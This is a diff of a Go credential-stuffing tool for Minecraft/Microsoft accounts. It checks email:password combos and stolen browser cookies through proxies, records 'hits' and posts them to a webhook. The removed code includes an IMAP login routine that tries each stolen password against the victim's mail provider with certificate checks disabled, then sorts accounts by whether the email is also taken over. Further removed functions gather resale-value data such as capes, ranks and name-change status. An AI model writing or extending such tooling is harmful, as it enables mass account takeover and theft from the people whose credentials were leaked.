@@ -1,11 +1,9 @@
 package main
 
 import (
-	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io"
-	"net"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -189,52 +187,6 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 		}
 	}
 
-	donutStats := ""
-	if cfg.DonutSMPStats && username != "Unknown" {
-		donutStats = checkDonutStats(username)
-		if donutStats != "" {
-			writeToFile("donut_smp_stats.txt", fmt.Sprintf("%s:%s | %s", email, password, donutStats))
-		}
-	}
-
-	planckeInfo := ""
-	if cfg.HypixelPlanckeStats && username != "Unknown" {
-		planckeInfo = checkHypixelPlancke(username)
-	}
-
-	optifineCape := ""
-	if cfg.OptifineCape && username != "Unknown" {
-		cape, err := checkOptifineCape(username)
-		if err != nil {
-			logError("value_check_errors.log", email+" optifine", err)
-		}
-		optifineCape = cape
-	}
-
-	mcCapes := ""
-	if cfg.MinecraftCapes {
-		mcCapes = getMinecraftCapes(profile)
-	}
-
-	emailAccess := ""
-	if cfg.EmailAccess {
-		emailAccess = checkEmailAccess(email, password)
-		if emailAccess == "True" {
-			writeToFile("mfa_accounts.txt", fmt.Sprintf("%s:%s | %s", email, password, username))
-		} else if emailAccess == "False" {
-			writeToFile("sfa_accounts.txt", fmt.Sprintf("%s:%s | %s", email, password, username))
-		}
-	}
-
-	namechangeInfo := ""
-	if cfg.NamechangeCheck {
-		nc, err := checkNamechange(accessToken)
-		if err != nil {
-			logError("value_check_errors.log", email+" namechange", err)
-		}
-		namechangeInfo = nc
-	}
-
 	if cfg.Sniper {
 		runSniper(client, accessToken, username)
 	}
@@ -252,13 +204,6 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 			gamepassResult, msBalance, rewardPoints, hypixelInfo, donutInfo)
 		sendWebhook(wh, embed)
 	}
-
-	_ = planckeInfo
-	_ = optifineCape
-	_ = mcCapes
-	_ = emailAccess
-	_ = namechangeInfo
-	_ = donutStats
 
 	atomic.AddInt64(&mcHits, 1)
 	fmt.Printf("\n  [HIT] %s | %s | GP: %s\n", username, uuid, gamepassResult)
@@ -437,40 +382,6 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 		}
 	}
 
-	planckeInfo := ""
-	if cfg.HypixelPlanckeStats && username != "Unknown" {
-		planckeInfo = checkHypixelPlancke(username)
-	}
-
-	optifineCape := ""
-	if cfg.OptifineCape && username != "Unknown" {
-		cape, err := checkOptifineCape(username)
-		if err != nil {
-			logError("value_check_errors.log", cookieFile+" optifine", err)
-		}
-		optifineCape = cape
-	}
-
-	mcCapes := ""
-	if cfg.MinecraftCapes {
-		mcCapes = getMinecraftCapes(profile)
-	}
-
-	emailAccess := ""
-	if cfg.EmailAccess {
-		emailAccess = checkEmailAccess(username+"@cookies.local", "")
-		_ = emailAccess
-	}
-
-	namechangeInfo := ""
-	if cfg.NamechangeCheck {
-		nc, err := checkNamechange(accessToken)
-		if err != nil {
-			logError("value_check_errors.log", cookieFile+" namechange", err)
-		}
-		namechangeInfo = nc
-	}
-
 	summary := fmt.Sprintf("Username: %s\nUUID: %s\nGamePass: %s\nRewards Points: %s\nMS Balance: %s\nHypixel: %s\nDonutSMP: %s",
 		username, uuid, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo)
 	if hypixelInfo != "" {
@@ -478,20 +389,6 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 	}
 	if donutInfo != "" {
 		summary += "\nDonutSMP: " + donutInfo
-	}
-	if planckeInfo != "" {
-		summary += "\nPlancke: " + planckeInfo
-		safeWrite(filepath.Join(rd, "plancke.txt"), planckeInfo)
-	}
-	if optifineCape != "" {
-		summary += "\nOptifine Cape: " + optifineCape
-	}
-	if mcCapes != "" {
-		summary += "\nMinecraft Capes: " + mcCapes
-	}
-	if namechangeInfo != "" {
-		summary += "\n" + namechangeInfo
-		safeWrite(filepath.Join(rd, "namechange.txt"), namechangeInfo)
 	}
 	safeWrite(filepath.Join(rd, "summary.txt"), summary)
 
@@ -513,12 +410,6 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 			gamepassResult, msBalance, rewardPoints, hypixelInfo, donutInfo)
 		sendWebhook(wh, embed)
 	}
-
-	_ = planckeInfo
-	_ = optifineCape
-	_ = mcCapes
-	_ = emailAccess
-	_ = namechangeInfo
 
 	fmt.Printf("\n  [COOKIE HIT] %s | %s | GP: %s\n", username, uuid, gamepassResult)
 }
@@ -854,250 +745,4 @@ func getCurrentTimestamp() int64 {
 	return time.Now().UnixMilli()
 }
 
-func checkHypixelPlancke(username string) string {
-	client := &http.Client{Timeout: 10 * time.Second}
-	req, _ := http.NewRequest("GET", "https://plancke.io/hypixel/player/stats/"+username, nil)
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0")
 
-	resp, err := client.Do(req)
-	if err != nil {
-		return ""
-	}
-	defer resp.Body.Close()
-
-	body, _ := io.ReadAll(resp.Body)
-	tx := string(body)
-
-	if strings.Contains(tx, "not found") || strings.Contains(tx, "View player") {
-		return ""
-	}
-
-	var parts []string
-
-	rankRe := regexp.MustCompile(`\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]`)
-	rankMatch := rankRe.FindString(tx)
-	if rankMatch != "" {
-		parts = append(parts, "Rank: "+rankMatch)
-	}
-
-	levelRe := regexp.MustCompile(`Level:</b>\s*([\d.]+)`)
-	levelMatch := levelRe.FindStringSubmatch(tx)
-	if len(levelMatch) >= 2 {
-		parts = append(parts, "Level: "+levelMatch[1])
-	}
-
-	bwRe := regexp.MustCompile(`<b>Level:</b>\s*(\d+)`)
-	bwMatch := bwRe.FindStringSubmatch(tx)
-	if len(bwMatch) >= 2 && bwMatch[1] != "0" {
-		parts = append(parts, "BW Stars: "+bwMatch[1])
-	}
-
-	firstLoginRe := regexp.MustCompile(`First login:\s*</b>\s*(.+?)<br`)
-	firstMatch := firstLoginRe.FindStringSubmatch(tx)
-	if len(firstMatch) >= 2 {
-		parts = append(parts, "First: "+strings.TrimSpace(firstMatch[1]))
-	}
-
-	lastLoginRe := regexp.MustCompile(`Last login:\s*</b>\s*(.+?)<br`)
-	lastMatch := lastLoginRe.FindStringSubmatch(tx)
-	if len(lastMatch) >= 2 {
-		parts = append(parts, "Last: "+strings.TrimSpace(lastMatch[1]))
-	}
-
-	if len(parts) > 0 {
-		return strings.Join(parts, " | ")
-	}
-	return ""
-}
-
-func checkOptifineCape(username string) (string, error) {
-	client := &http.Client{Timeout: 8 * time.Second}
-	resp, err := client.Get("http://s.optifine.net/capes/" + username + ".png")
-	if err != nil {
-		return "Unknown", wrapNetError(err)
-	}
-	defer resp.Body.Close()
-
-	body, _ := io.ReadAll(resp.Body)
-	if strings.Contains(string(body), "Not found") {
-		return "No", nil
-	}
-	return "Yes", nil
-}
-
-func checkNamechange(accessToken string) (string, error) {
-	client := &http.Client{Timeout: 10 * time.Second}
-	req, _ := http.NewRequest("GET", "https://api.minecraftservices.com/minecraft/profile/namechange", nil)
-	req.Header.Set("Authorization", "Bearer "+accessToken)
-	req.Header.Set("User-Agent", UserAgent)
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return "", wrapNetError(err)
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		return "", nil
-	}
-
-	body, _ := io.ReadAll(resp.Body)
-	var result map[string]interface{}
-	if err := json.Unmarshal(body, &result); err != nil {
-		return "", nil
-	}
-
-	allowed, _ := result["nameChangeAllowed"].(bool)
-	createdAt, _ := result["createdAt"].(string)
-
-	info := fmt.Sprintf("NameChange: %v", allowed)
-	if createdAt != "" {
-		info += " | Last: " + createdAt
-	}
-	return info, nil
-}
-
-func checkEmailAccess(email, password string) string {
-	domain := ""
-	parts := strings.SplitN(email, "@", 2)
-	if len(parts) == 2 {
-		domain = strings.ToLower(parts[1])
-	}
-
-	var imapServer string
-	switch {
-	case strings.Contains(domain, "gmail") || strings.Contains(domain, "googlemail"):
-		imapServer = "imap.gmail.com:993"
-	case strings.Contains(domain, "yahoo"):
-		imapServer = "imap.mail.yahoo.com:993"
-	case strings.Contains(domain, "outlook"), strings.Contains(domain, "hotmail"), strings.Contains(domain, "live"):
-		imapServer = "outlook.office365.com:993"
-	case strings.Contains(domain, "icloud"), strings.Contains(domain, "me.com"), strings.Contains(domain, "mac.com"):
-		imapServer = "imap.mail.me.com:993"
-	case strings.Contains(domain, "aol"):
-		imapServer = "imap.aol.com:993"
-	default:
-		imapServer = "imap." + domain + ":993"
-	}
-
-	conn, err := net.DialTimeout("tcp", imapServer, 10*time.Second)
-	if err != nil {
-		return "Unknown"
-	}
-	defer conn.Close()
-
-	tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
-	defer tlsConn.Close()
-
-	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
-
-	buf := make([]byte, 1024)
-	_, err = tlsConn.Read(buf)
-	if err != nil {
-		return "Unknown"
-	}
-
-	_, err = fmt.Fprintf(tlsConn, "a001 LOGIN %s %s\r\n", email, password)
-	if err != nil {
-		return "Unknown"
-	}
-
-	n, err := tlsConn.Read(buf)
-	if err != nil {
-		return "Unknown"
-	}
-
-	resp := string(buf[:n])
-	if strings.Contains(resp, "OK") {
-		return "True"
-	}
-	return "False"
-}
-
-func getMinecraftCapes(profile *MCProfile) string {
-	if profile == nil {
-		return ""
-	}
-	var capes []string
-	for _, c := range profile.Capes {
-		if c.Alias != "" {
-			capes = append(capes, c.Alias)
-		}
-	}
-	return strings.Join(capes, ", ")
-}
-
-func checkDonutStats(username string) string {
-	client := &http.Client{Timeout: 10 * time.Second}
-	req, _ := http.NewRequest("GET", "https://api.donutsmp.net/v1/stats/"+username, nil)
-	req.Header.Set("User-Agent", UserAgent)
-	req.Header.Set("Accept", "application/json")
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return ""
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode == 404 {
-		return "player not found"
-	}
-	if resp.StatusCode == 429 {
-		return "rate limited"
-	}
-	if resp.StatusCode != 200 {
-		return ""
-	}
-
-	body, _ := io.ReadAll(resp.Body)
-	var result map[string]interface{}
-	if err := json.Unmarshal(body, &result); err != nil {
-		return ""
-	}
-
-	var stats []string
-	if data, ok := result["result"].(map[string]interface{}); ok {
-		if k, ok := data["kills"]; ok {
-			stats = append(stats, fmt.Sprintf("Kills: %v", k))
-		}
-		if d, ok := data["deaths"]; ok {
-			stats = append(stats, fmt.Sprintf("Deaths: %v", d))
-		}
-		if m, ok := data["money"]; ok {
-			stats = append(stats, fmt.Sprintf("Money: %v", m))
-		}
-		if p, ok := data["playtime"]; ok {
-			stats = append(stats, fmt.Sprintf("Playtime: %v", p))
-		}
-		if bb, ok := data["broken_blocks"]; ok {
-			stats = append(stats, fmt.Sprintf("Blocks: %v", bb))
-		}
-	}
-	if len(stats) > 0 {
-		return strings.Join(stats, " | ")
-	}
-	return ""
-}
-
-func formatHypixelInfo(apiInfo, planckeInfo, optifineCape, minecraftCapes, namechangeInfo string) string {
-	var parts []string
-	if apiInfo != "" {
-		parts = append(parts, apiInfo)
-	}
-	if planckeInfo != "" {
-		parts = append(parts, planckeInfo)
-	}
-	if optifineCape != "" {
-		parts = append(parts, "Optifine: "+optifineCape)
-	}
-	if minecraftCapes != "" {
-		parts = append(parts, "Capes: "+minecraftCapes)
-	}
-	if namechangeInfo != "" {
-		parts = append(parts, namechangeInfo)
-	}
-	if len(parts) > 0 {
-		return strings.Join(parts, " | ")
-	}
-	return ""
-}
